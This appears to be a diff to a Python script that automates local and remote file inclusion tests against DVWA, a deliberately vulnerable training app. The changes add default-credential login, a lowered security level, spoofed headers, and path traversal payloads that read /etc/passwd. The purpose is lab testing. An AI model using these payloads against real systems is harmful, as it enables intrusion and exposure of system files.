@@ -24,17 +24,41 @@ else:
 delays = {'low': 10, 'medium': 5, 'high': 3}
 delay = delays.get(request_rate, 'medium')  # Default to 'medium' if rate is unrecognized
 
+headers = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
+    'X-Forwarded-For': '192.168.1.1'
+}
+
 fi_url = f"{base_url}/vulnerabilities/fi/?page="
+login_url = f"{base_url}/login.php"
+security_url = f"{base_url}/security.php"
 
 def login_and_setup_security():
-    # Assuming login is required; adjust as necessary
-    pass
+    #response = session.get(login_url)
+    data = {
+        'username': 'admin',
+        'password': 'password',
+        'Login': 'Login',
+    }
+    response = session.post(login_url, data=data, headers=headers)
+    soup = BeautifulSoup(response.text, 'html.parser')
+    user_token = soup.find('input', {'name': 'user_token'}).get('value') if soup.find('input', {'name': 'user_token'}) else None
+    time.sleep(delay) 
+    
+    #response = session.get(security_url)
+    data = {
+        'security': 'low',
+        'seclev_submit': 'Submit',
+        'user_token': user_token
+    }
+    session.post(security_url, data=data, headers=headers)
+    time.sleep(delay) 
 
 def file_inclusion_attack():
     file_paths = [
-        "../hackable/flags/fi.php",  # Typically LFI
-        "../../../../../../etc/passwd", # Typically LFI
-        "https://www.google.com",  # RFI
+        "../hackable/flags/fi.php",  # LFI
+        "../../../../../../etc/passwd", # LFI
+        "https://www.google.com"  # RFI
     ]
     total_tests = 0
     tests_passed = 0
@@ -43,37 +67,37 @@ def file_inclusion_attack():
 
     for file_path in file_paths:
         full_url = fi_url + file_path
-        response = session.get(full_url)
+        response = session.get(full_url, headers=headers)
         total_tests += 1
+        content_check = False
 
-        if "https" in file_path:
+        if "https" in file_path:  # Assuming RFI attempt for https URLs
             test_type = "RFI"
-            expected_content = "Google"
-            successful = response.status_code == 200 and expected_content in response.text
+            expected_contents = ["Google", "Pesquisa Google", "Estou com sorte"]  # Examples of text expected from Google
+            content_check = any(text in response.text for text in expected_contents)
         else:
             test_type = "LFI"
-            expected_content1 = "Nice try ;-). Use the file include next time!"
-            expected_content2 = "famous quotes"
-            successful = (response.status_code == 200 and 
-                          (expected_content1 in response.text or expected_content2 in response.text))
-        
-        if successful:
+            expected_contents = ["1.) Bond. James Bond", "root:x:0:0:root"]
+            content_check = any(text in response.text for text in expected_contents)
+
+        if response.status_code == 200 and content_check:
             tests_passed += 1
             result_status = f"PASSED - {test_type} Successful"
         else:
             tests_failed += 1
             result_status = f"FAILED - {test_type} Unsuccessful"
-            
-        print(f"Tested {test_type} with path '{file_path}'\nResult Status: {result_status}\nResponse Code: {response.status_code}\n")
+        
+        print(f"Tested {test_type} with path '{file_path}'\nResult Status: {result_status}\nResponse Code: {response.status_code}\nContent Check: {content_check}")
         time.sleep(delay)
-
+        
         details.append({
             "test_type": test_type,
             "path": file_path,
             "response_code": response.status_code,
             "status": result_status,
+            "content_check": content_check  # Adding whether the content check was successful
         })
-        print(f"Tested {test_type} with path '{file_path}'\nResult Status: {result_status}\nResponse Code: {response.status_code}\n")
+        
 
     # Log the results
     script_name = os.path.splitext(os.path.basename(__file__))[0]
